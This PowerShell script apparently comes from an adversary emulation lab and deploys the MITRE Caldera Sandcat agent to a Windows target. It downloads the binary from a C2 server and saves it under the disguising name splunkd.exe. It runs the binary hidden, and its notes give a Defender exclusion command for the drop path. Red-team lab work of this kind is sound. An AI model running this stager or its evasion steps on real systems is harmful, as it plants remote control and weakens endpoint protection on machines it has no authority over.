<#
.SYNOPSIS
    Deploys the MITRE Caldera Sandcat agent to a Windows endpoint.

.DESCRIPTION
    Downloads the Sandcat agent binary from a running Caldera C2 server and
    launches it as a background process on the target Windows machine,
    joining the "red" operation group. Used in this lab to deploy Caldera's
    agent from the Kali attacker VM onto the Windows victim endpoint for
    adversary emulation exercises (e.g. MITRE ATT&CK Discovery techniques).

.NOTES
    - Run this FROM the target Windows endpoint (not the Caldera server).
    - Update $server to match your Caldera server's reachable IP:port.
    - The agent runs as a plain background process, not a service, so it
      does not persist across reboots — re-run this script after restarting
      the target VM if you want the agent active again.
    - Windows Defender (or any AV) will likely flag/quarantine this as
      malicious, which is expected and correct behaviour for an adversary
      emulation tool. In this lab, a scoped exclusion was added for the
      drop path rather than disabling protection entirely:
        Add-MpPreference -ExclusionPath "C:\Users\Public\"
#>

$server = "http://10.10.10.142:8888"   # Caldera server address — update to match your environment
$url = "$server/file/download"

$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform", "windows")
$wc.Headers.add("architecture", "amd64")
$wc.Headers.add("file", "sandcat.go")
$data = $wc.DownloadData($url)

# Clean up any previous instance before redeploying
Get-Process | Where-Object { $_.Modules.FileName -like "C:\Users\Public\splunkd.exe" } | Stop-Process -Force
Remove-Item -Force "C:\Users\Public\splunkd.exe" -ErrorAction Ignore

[IO.File]::WriteAllBytes("C:\Users\Public\splunkd.exe", $data) | Out-Null

Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server $server -group red" -WindowStyle Hidden
